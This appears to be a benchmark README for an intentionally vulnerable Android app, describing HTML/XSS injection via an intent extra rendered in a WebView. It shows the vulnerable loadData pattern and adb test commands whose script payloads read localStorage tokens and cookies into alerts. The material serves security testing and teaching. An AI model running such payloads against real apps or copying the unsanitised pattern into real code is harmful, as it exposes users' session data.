# oxo-android-ben43: HTML Injection Through Intent Parameter

## Vulnerability Overview

HTML Injection Through Intent Parameter occurs when an Android app's WebView component displays content received from intent parameters without proper sanitization. This vulnerability allows attackers to inject malicious HTML, CSS, and JavaScript code through intent extras, leading to Cross-Site Scripting (XSS) attacks within the WebView context.

## Attack Vector: Basic XSS via Script Tag Injection

**Brief Explanation**: Direct injection of `<script>` tags through intent parameters that execute JavaScript when the HTML content is loaded in WebView.

**Key Characteristics:**
- Intent parameter contains malicious script tags
- WebView executes JavaScript without validation
- Can access WebView context and perform unauthorized actions
- Immediate execution upon content load

**Vulnerable Code Pattern:**
```kotlin
val htmlContent = intent.getStringExtra("content") ?: "Default content"
webView.loadData(htmlContent, "text/html", "utf-8")  // VULNERABLE!
```

## Testing

```bash
# Basic XSS attack with alert
adb shell am start -n co.ostorlab.myapplication/.HtmlViewerActivity -e content "<script>alert('XSS Attack!')</script>"

# XSS with localStorage access
adb shell am start -n co.ostorlab.myapplication/.HtmlViewerActivity -e content "<h1>News Article</h1><script>alert('Sensitive Data: ' + localStorage.getItem('userToken'))</script>"

# XSS with document.cookie access
adb shell am start -n co.ostorlab.myapplication/.HtmlViewerActivity -e content "<script>alert('Cookie: ' + document.cookie)</script>"

# Multiple script tags
adb shell am start -n co.ostorlab.myapplication/.HtmlViewerActivity -e content "<script>console.log('First script')</script><p>Content</p><script>alert('Second script executed!')</script>"
```

**Difficulty**: Easy

## Impact Assessment

- **Confidentiality**: High - Can access sensitive app data, cookies, local storage
- **Integrity**: High - Can modify app content and user interface
- **Availability**: Medium - Can redirect users or cause app malfunction
- **OWASP Mobile Top 10**: M7 - Client Code Quality
- **CWE**: CWE-79 (Cross-site Scripting), CWE-20 (Improper Input Validation)
